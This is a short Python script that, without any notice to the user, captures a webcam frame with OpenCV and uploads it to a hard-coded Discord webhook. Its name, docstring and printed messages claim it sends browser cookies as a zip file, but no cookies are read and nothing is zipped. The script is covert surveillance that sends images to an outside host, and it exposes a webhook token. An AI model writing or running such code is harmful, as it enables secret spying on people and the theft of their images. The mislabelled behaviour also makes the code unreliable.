import requests
import cv2

def take_photo_and_send_cookies(webhook_url: str):
    """
    Function to take a photo with the front camera and send the cookies to a webhook as a zip file.

    Parameters:
    - webhook_url: str
        The URL of the webhook to which the cookies will be sent.

    Raises:
    - ValueError:
        Raises an error if the webhook URL is empty or invalid.
    """

    # Checking if the webhook URL is empty or invalid
    if not webhook_url:
        raise ValueError("Invalid webhook URL.")

    # Capturing photo using the front camera
    camera = cv2.VideoCapture(0)
    _, photo = camera.read()
    camera.release()

    # Saving the photo as a file
    photo_file = "photo.jpg"
    cv2.imwrite(photo_file, photo)

    # Sending the photo file as a zip to the webhook
    try:
        with open(photo_file, 'rb') as file:
            files = {'file': file}
            response = requests.post(webhook_url, files=files)
            response.raise_for_status()
            print("Cookies sent successfully.")
    except requests.exceptions.RequestException as e:
        print(f"Error sending cookies: {e}")

# Example usage:
webhook_url = "https://discord.com/api/webhooks/1179754334548922439/xGhYVQkS9YWjFrR9ca2r3g9kMR6mgtL98EInOXerbjbh0Q2GoI47B3Qi_mWmVgINd9uc"
try:
    take_photo_and_send_cookies(webhook_url)
except ValueError as e:
    print(f"Error: {e}")